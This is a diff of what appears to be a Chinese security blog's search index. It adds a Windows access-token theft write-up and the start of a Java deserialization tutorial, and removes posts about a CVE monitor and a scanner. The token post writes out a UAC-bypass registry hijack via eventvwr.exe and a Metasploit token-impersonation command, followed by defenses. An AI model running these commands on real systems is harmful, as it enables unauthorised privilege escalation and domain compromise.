-<p>替换打成功<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521091957.png" alt="image-20210521084722601"></p>
-<p>其实一开始是失败的，shiro550自带的包是commons-collections3.2.1,原生情况下直接用ysoserial打，是不会成功的，其他位置中直接添加了<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092002.png" alt="image-20210521091756305"></p>
-<p>commons-collections4的包，才可以顺畅复现。至于为啥原生的3.2.1不能触发漏洞，以及可不可以触发漏洞，下篇文章再分析。</p>
-<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Apache Shiro Java 反序列化漏洞分析 <a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a> </p>
-<p>Java安全之Shiro 550反序列化漏洞分析 <a href="https://www.anquanke.com/post/id/225442#h3-8">https://www.anquanke.com/post/id/225442#h3-8</a> </p>
-<p>ysoserial <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
 ]]></content>
       <categories>
-        <category>漏洞原理</category>
+        <category>GitHub工具</category>
       </categories>
       <tags>
-        <tag>漏洞原理</tag>
+        <tag>GitHub工具</tag>
       </tags>
   </entry>
   <entry>
@@ -659,39 +825,83 @@
       </tags>
   </entry>
   <entry>
-    <title>gitHub_cve_monitor</title>
-    <url>/2021/02/25/github_cve_monitor/</url>
+    <title>令牌窃取分析及防范</title>
+    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
     <content><![CDATA[<blockquote>
-<p>没事少矫情，有空多赚钱。</p>
+<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
 </blockquote>
-<h2 id="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"><a href="#监控github上新增的cve编号项目漏洞，推送钉钉或者server酱" class="headerlink" title="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"></a>监控github上新增的cve编号项目漏洞，推送钉钉或者server酱</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install dingtalkchatbot</span><br><span class="line">python3 github_cve_monitor.py</span><br></pre></td></tr></table></figure>
+<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
+<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
+<ul>
+<li>  访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
+<li>  密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
+<li>  会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
+</ul>
+<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
+<p>目前访问令牌分为两种令牌：</p>
+<ul>
+<li>  主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
+<li>  模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ul>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
+<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
+<ul>
+<li>  用户帐户的安全标识符(SID)</li>
+<li>  用户帐户所属的用户群的SIDs</li>
+<li>  一个logon SID，标识当前登录会话</li>
+<li>  用户或用户群的特权清单</li>
+<li>  所有者的SID</li>
+<li>  基本群的SID</li>
+<li>  当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
+<li>  访问令牌资源</li>
+<li>  是否为primary或impersonation token</li>
+<li>  限制性SIDs的可选列表</li>
+<li>  当前impersonation级别</li>
+<li>  其他统计</li>
+</ul>
+<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
+<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
+<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
+<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
+<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085126.png" alt="image-20210129091617259"></p>
+<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /d c:\testftp\shell.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
 
-<p>每3分钟检测一次github是否有新的cve漏洞提交记录，若有则通过server酱和钉钉机器人推送（二者配置一个即可）</p>
-<p>时间间隔修改在 58 行</p>
-<p>建议使用<a href="https://www.runoob.com/linux/linux-comm-screen.html">screen命令</a>运行在自己的linux vps后台上，就可以愉快的接收各种cve了</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S github_cve	<span class="comment">#创建一个screen，名字为github_cve，在新窗口运行本项目, 成功后直接叉掉该窗口, 项目就会在后台一直运行了</span></span><br><span class="line"></span><br><span class="line">screen -ls 		<span class="comment">#查看创建的screen</span></span><br><span class="line"></span><br><span class="line">screen -r github_cve	<span class="comment">#连接github_cve后台screen，如果存在的话</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085131.png" alt="image-20210128223604660"></p>
+<blockquote>
+<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
+<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
+</blockquote>
+<p>得到授权令牌：        </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
 
+<p>得到模拟令牌：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
 
+<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impersonate_token &#39;TEST\Administrator&#39;</span><br></pre></td></tr></table></figure>
 
-<p>钉钉机器人配置在 33行的 dingding函数中，需要钉钉建群，添加钉钉机器人，复制 webhook 替换即可</p>
-<p>server酱配置在 40行的 server 函数中，ps：因微信的原因，server酱的旧版将在2021年4月后下线，新版以企业微信为主，这里使用的是旧版，想改新版的话，搞个企业微信，从新配置server酱，使用新链接 sctapi.ftqq.com</p>
-<p>具体查看server酱官方，<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ，配置简单，只需要将脚本中的uri换掉即可</p>
-<p><a href="https://sct.ftqq.com/">server酱新版</a>支持多通道（微信、客户端、群机器人、邮件和短信）</p>
-<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093627.png" alt="image-20210225090416314"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225094630.jpg" alt="751614217534_.pic"></p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093635.png" alt="image-20210225092350481"></p>
-<p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li>  洛米唯熊     <a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li>
-<li>  kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085137.png" alt="image-20210128223730735"></p>
+<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085141.png" alt="image-20210128223804482"></p>
+<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
+<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
+<ul>
+<li>  为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
+<li>  及时安装微软推送的补丁</li>
+<li>  对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
+<li>  对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
+<li>  对于令牌，应采取加密存储及多长验证保护</li>
+<li>  使用加密链路SSL/TLS传输令牌，以防止被中间人窃听</li>
 </ul>
 ]]></content>
       <categories>
-        <category>GitHub工具</category>
+        <category>域渗透</category>
       </categories>
       <tags>
-        <tag>GitHub工具</tag>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -814,91 +1024,78 @@
       </tags>
   </entry>
   <entry>
-    <title>SScan  一款src捡洞扫描器</title>
-    <url>/2021/01/11/SScan/</url>
-    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
-<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
-<p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p>
-<h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
-<p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p>
-<h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/<span class="built_in">dirs</span>/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">    --fofa       是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py </span><br></pre></td></tr></table></figure>
+    <title>初探Java反序列化漏洞(一)</title>
+    <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
+    <content><![CDATA[<blockquote>
+<p>  学无止境，参考着资料边学边记录吧。</p>
+</blockquote>
+<h2 id="0x01-Java序列化与反序列化"><a href="#0x01-Java序列化与反序列化" class="headerlink" title="0x01 Java序列化与反序列化"></a>0x01 Java序列化与反序列化</h2><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程。这一过程将数据分解成字节流，以便存储在文件中或在网络上传输；</p>
+<p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。就是打开字节流并重构成对象，恢复数据。</p>
+<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过以下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写入对象内容</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 读取对象内容</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br></pre></td></tr></table></figure>
 
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
-<li><p><input checked="" disabled="" type="checkbox">  常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p>
+<h2 id="0x02-为什么需要序列化与反序列化"><a href="#0x02-为什么需要序列化与反序列化" class="headerlink" title="0x02 为什么需要序列化与反序列化"></a>0x02 为什么需要序列化与反序列化</h2><p>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。而当两个Java进程进行通信时，可以通过Java的序列化与反序列化在进程之间直接传送对象，换句话说，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；接收方需要从字节序列中恢复出Java对象。</p>
+<p>使用场景：</p>
+<ul>
+<li><p>  想把内存中的对象保存到一个文件中或者数据库中时候；</p>
 </li>
-<li><p><input checked="" disabled="" type="checkbox">  信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p>
+<li><p>  想用套接字在网络上传送对象的时候；</p>
 </li>
-<li><p><input checked="" disabled="" type="checkbox">  后台登录页面资产发现</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox">  403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p>
-<p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p>
-<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox">  扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox">  跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox">  一些常见未授权和弱口令检测，目前支持：</p>
-<p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p>
-<p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox">  当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p>
+<li><p>  想通过RMI传输对象的时候</p>
 </li>
 </ul>
-<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul>
-<li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li>
-<li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li>
-<li><input disabled="" type="checkbox"> 继续优化各模块</li>
-</ul>
-<h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul>
-<li><p>black.list 规则黑名单，命中则跳过</p>
-</li>
-<li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p>
-</li>
-<li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>
-  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;applicationContext-slave.xml &#123;tag&#x3D;&quot;&lt;?xml&quot;&#125; &#123;status&#x3D;200&#125; &#123;type&#x3D;&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>
+<p>一些应用场景涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p>
+<p>总之，序列化的用途就是传递和存储。</p>
+<h2 id="0x03-序列化实现的方式"><a href="#0x03-序列化实现的方式" class="headerlink" title="0x03 序列化实现的方式"></a>0x03 序列化实现的方式</h2><h3 id="3-1-Serializable"><a href="#3-1-Serializable" class="headerlink" title="3.1 Serializable"></a>3.1 Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是String类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化(用<code>transient</code>关键字修饰的属性除外，不参与序列化过程) 。</p>
+<p><strong>需要序列化的类</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 21:46</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p><strong>序列化</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSerializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line">        serialize(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(User user)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到运行后，生产了一个文件，将<code>user</code> 对象变成了可持久化存储的二进制数据。</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211458.png" alt="image-20210404222530833"></p>
+<p>可以来看一下该对象序列化后的二进制数据</p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211505.png" alt="image-20210404223840477"></p>
+<p>序列化的数据流以魔术数字和版本号开头，这个值是在调用<code>ObjectOutputStream</code>序列化时，由<code>writeStreamHeader</code>方法写入。开头的几位一般来当作Java序列化字节的特征。</p>
+<p><strong>反序列化</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/4 22:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSerializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化， 将对象转化为字节序列</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        <span class="comment">// 反序列化，将字节序列恢复为对象</span></span><br><span class="line">        User user1 = unserialize();</span><br><span class="line">        System.out.println(user1.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> User <span class="title">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;user.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">        User user = (User) in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        fileIn.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211519.png" alt="image-20210404224748419"></p>
+<p>读取了序列化文件，将二进制文件重新恢复为<code>user</code>对象，对象里面的属性也是完美恢复。</p>
+<h3 id="3-2-Externalizable"><a href="#3-2-Externalizable" class="headerlink" title="3.2 Externalizable"></a>3.2 Externalizable</h3><p>通过实现<code>Externalizable</code>接口进行序列化和反序列胡，但必须实现<code>writeExternal</code>、<code>readExternal</code>方法，并且还要实现一个类的<strong>无参构造方法</strong>，<code>Serializable</code> 接口可以不用实现。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/4/5 00:24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Externalizable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现了Externalizable这个接口需要提供无参构造，在反序列化时会检测</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.getClass() + <span 